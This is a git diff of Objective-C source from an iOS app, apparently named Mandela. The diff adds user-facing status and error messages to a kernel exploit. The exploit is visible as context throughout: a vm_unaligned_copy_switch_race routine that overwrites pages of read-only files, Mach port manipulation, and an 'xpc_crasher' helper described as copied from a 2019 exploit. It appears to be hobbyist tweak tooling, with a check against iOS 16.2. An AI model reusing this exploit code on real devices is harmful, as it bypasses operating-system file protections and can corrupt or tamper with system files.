@@ -17,7 +17,9 @@
 #include <libkern/OSAtomic.h> // I want a real spinlock!
 #include <sys/time.h>
 #include "vm_unaligned_copy_switch_race.h"
-#import <Mandela-Swift.h> // Expose header from swift
+#import <Mandela-Swift.h> // Expose functions from Swift
+
+void setMessage(NSString *str);
 
 char* get_temp_file_path(void) {
   return strdup([[NSTemporaryDirectory() stringByAppendingPathComponent:@"AAAAs"] fileSystemRepresentation]);
@@ -56,12 +58,12 @@ mach_port_t get_send_once(mach_port_t recv) {
   kern_return_t err = mach_port_extract_right(mach_task_self(), recv, MACH_MSG_TYPE_MAKE_SEND_ONCE, &so, &type);
   if (err != KERN_SUCCESS) {
     printf("port right extraction failed: %s\n", mach_error_string(err));
+      setMessage(@"GURU MEDITATION: Port right extraction failed!\nPlease send this to BomberFish with the following information: fail at 59");
     return MACH_PORT_NULL;
   }
   printf("made so: 0x%x from recv: 0x%x\n", so, recv);
   return so;
 }
-
 // copy-pasted from an exploit I wrote in 2019...
 // still works...
 
@@ -75,12 +77,14 @@ void xpc_crasher(char* service_name) {
 
   kern_return_t err = bootstrap_look_up(bootstrap_port, service_name, &service_port);
   if(err != KERN_SUCCESS){
-    printf("unable to look up %s\n", service_name);
+      printf("unable to look up %s\n", service_name);
+      setMessage(@"GURU MEDITATION: Unable to look up a service!\nPlease send this to BomberFish with the following information: fail at 81");
     return;
   }
 
   if (service_port == MACH_PORT_NULL) {
     printf("bad service port\n");
+      setMessage(@"GURU MEDITATION: Bad service port!\nPlease send this to BomberFish with the following information: fail at 85");
     return;
   }
 
@@ -88,6 +92,7 @@ void xpc_crasher(char* service_name) {
   err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &client_port);
   if (err != KERN_SUCCESS) {
     printf("port allocation failed: %s\n", mach_error_string(err));
+       setMessage(@"GURU MEDITATION: Port allocation failed!\nPlease send this to BomberFish with the following information: fail at 93");
     return;
   }
 
@@ -97,14 +102,16 @@ void xpc_crasher(char* service_name) {
   // insert a send so we maintain the ability to send to this port
   err = mach_port_insert_right(mach_task_self(), client_port, client_port, MACH_MSG_TYPE_MAKE_SEND);
   if (err != KERN_SUCCESS) {
-    printf("port right insertion failed: %s\n", mach_error_string(err));
+      printf("port right insertion failed: %s\n", mach_error_string(err));
+      setMessage(@"GURU MEDITATION: Port right insertion failed!\nPlease send this to BomberFish with the following information: fail at 104");;
     return;
   }
 
   err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &reply_port);
   if (err != KERN_SUCCESS) {
-    printf("port allocation failed: %s\n", mach_error_string(err));
-    return;
+      printf("port allocation failed: %s\n", mach_error_string(err));
+      setMessage(@"GURU MEDITATION: Port allocation failed!\nPlease send this to BomberFish with the following information: fail at 111");
+      	return;
   }
 
   struct xpc_w00t msg;
@@ -156,7 +163,6 @@ void* alloc_at(mach_vm_address_t desired_address, mach_vm_size_t size) {
   return (void*)desired_address;
 }
 
-// Ignore warnings, we want the REAL SpinLock.
 OSSpinLock running_lock = 1;  // locked
 OSSpinLock start_lock = 1;    // locked
 OSSpinLock stop_lock = 0;     // unlocked
@@ -177,6 +183,7 @@ void map_target_file_page_ro(int fd, void* target_addr, uint32_t file_page_offse
   void* mapped_at = mmap(target_addr, PAGE_SIZE, PROT_READ, MAP_FILE | MAP_FIXED | MAP_SHARED, fd, file_page_offset);
   if (mapped_at == MAP_FAILED) {
     printf("MMAP FAILED for target address: %p\n", target_addr);
+      setMessage(@"GURU MEDITATION: MMAP failed!\nPlease send this to BomberFish with the following information: fail at 185");
     perror("mmap error:");
   }
 }
@@ -238,6 +245,7 @@ void* get_empty_region(void) {
   int kr = mach_vm_allocate(mach_task_self(), &addr, size, VM_FLAGS_ANYWHERE);
   if (kr != KERN_SUCCESS) {
     printf("failed to reserve large chunk of address space: (%s)\n", mach_error_string(kr));
+      setMessage(@"GURU MEDITATION: Failed to reserve address space!\nPlease send this to BomberFish with the following information: fail at 247");
     return NULL;
   }
   
@@ -257,10 +265,12 @@ void replace_file_page(char* target_path, uint32_t target_offset, uint8_t* new_p
   int target_fd = open(target_path, O_RDONLY);
   if (target_fd == -1) {
     printf("failed to open the target file\n");
+      setMessage(@"GURU MEDITATION: Failed to open the file!\nPlease send this to BomberFish with the following information: fail at 267");
   }
   
   if (ROUND_DOWN_PAGE(target_offset) != target_offset) {
     printf("ERROR: this API only works for whole pages!!\n");
+      setMessage(@"GURU MEDITATION: Not a full page!\nPlease send this to BomberFish with the following information: fail at 272");
     return;
   }
   
@@ -268,6 +278,7 @@ void replace_file_page(char* target_path, uint32_t target_offset, uint8_t* new_p
   success_ptr = mmap(0, PAGE_SIZE, PROT_READ, MAP_FILE | MAP_SHARED, target_fd, target_offset);
   if (success_ptr == MAP_FAILED) {
     printf("failed to mmap file for success test\n");
+      setMessage(@"GURU MEDITATION: Failed to mmap file!\nPlease send this to BomberFish with the following information: fail at 282");
     return;
   }
   
@@ -285,7 +296,6 @@ void replace_file_page(char* target_path, uint32_t target_offset, uint8_t* new_p
   while (1) {
     iter_count++;
     kern_return_t kr;
-    
     mach_vm_address_t empty_region_base = get_empty_region();
     
     mach_vm_address_t e0 = empty_region_base + (PAGE_SIZE*6000);
@@ -308,6 +318,7 @@ void replace_file_page(char* target_path, uint32_t target_offset, uint8_t* new_p
                                             &named_port);
     if (kr != KERN_SUCCESS) {
       printf("failed to allocate memory object\n");
+      setMessage(@"GURU MEDITATION: Failed to allocate memory object!\nPlease send this to BomberFish with the following information: fail at 320");
     }
     
     kr = mach_vm_map(mach_task_self(),
@@ -323,6 +334,8 @@ void replace_file_page(char* target_path, uint32_t target_offset, uint8_t* new_p
                      VM_INHERIT_NONE); // inheritance
     if (kr != KERN_SUCCESS) {
       printf("failed to map memory object copy at e2\n");
+        setMessage(@"GURU MEDITATION: Failed to map memory object copy at e2!\nPlease send this to BomberFish with the following information: fail at 336");
+        
     } else {
       printf("mapped e2 at: 0x%llx\n", e2);
     }
@@ -366,11 +379,13 @@ void replace_file_page(char* target_path, uint32_t target_offset, uint8_t* new_p
                                 size_to_copy,    //       FOR this many bytes
                                 (e2+1), //      TO this address in this current map
                                 &copied_size);
-    
     if (kr != KERN_SUCCESS) {
       printf("overwrite failed\n");
+      setMessage(@"GURU MEDITATION: Couldn't overwrite file!\nAre you on 16.2?");
     } else {
       printf("overwrite succeeded\n");
+        setMessage(@"Success: Overwrite succeeded!");
+    
     }
     
     // success test:
@@ -408,24 +423,29 @@ void replace_file_page(char* target_path, uint32_t target_offset, uint8_t* new_p
   return;
 }
 
+
 void* file_page(char* path, uint32_t page_offset) {
   int fd = open(path, O_RDONLY);
   if (fd < 0) {
     printf("failed to open file: %s\n", path);
+    setMessage(@"GURU MEDITATION: Failed to open the file!\nPlease send this to BomberFish with the following information: fail at 430");
     return NULL;
   }
   
+    
   kern_return_t kr;
   mach_vm_address_t addr = 0;
   kr = mach_vm_allocate(mach_task_self(), &addr, PAGE_SIZE, VM_FLAGS_ANYWHERE);
   if (kr != KERN_SUCCESS) {
     printf("mach_vm_allocate failed\n");
+      setMessage(@"GURU MEDITATION: mach_vm_allocate has failed!\nPlease send this to BomberFish with the following information: fail at 439");
     return NULL;
   }
   
   off_t offset = lseek(fd, page_offset, SEEK_SET);
   if (offset != page_offset) {
     printf("failed to seek the file\n");
+      setMessage(@"GURU MEDITATION: Failed to seek the file!\nPlease send this to BomberFish with the following information: fail at 446");
   }
   
   ssize_t n_read = read(fd, (void*)addr, PAGE_SIZE);
@@ -443,12 +463,12 @@ void free_page(uint8_t* page) {
   mach_vm_deallocate(mach_task_self(), (mach_vm_address_t)page, PAGE_SIZE);
 }
 
-// TODO: Add success detection
-
 void overwriteFile(NSData *data, NSString *path) {
+  setMessage(@"Applying...");
   int fd = open([path UTF8String], O_RDONLY);
   if (fd < 0) {
     printf("failed to open file: %s\n", [path UTF8String]);
+    setMessage(@"GURU MEDITATION: Failed to open the file!\nPlease send this to BomberFish with the following information: fail at 470");
     return;
   }
 
@@ -462,12 +482,14 @@ void overwriteFile(NSData *data, NSString *path) {
     // is the length of the page correct?
     if (length != PAGE_SIZE) {
       printf("page %d is not full length, filling with zeros\n", i);
+        setMessage(@"Warning: Page is not full-length, padding with zeros...");
       length = PAGE_SIZE;
       memset(page + length, 0, PAGE_SIZE - length);
     }
     replace_file_page([path UTF8String], offset, page);
     free(page);
     NSLog(@"wrote page %d, offset %d, length %d", i, offset, length);
+    setMessage(@"Success: Wrote file!");
   }
 
   close(fd);
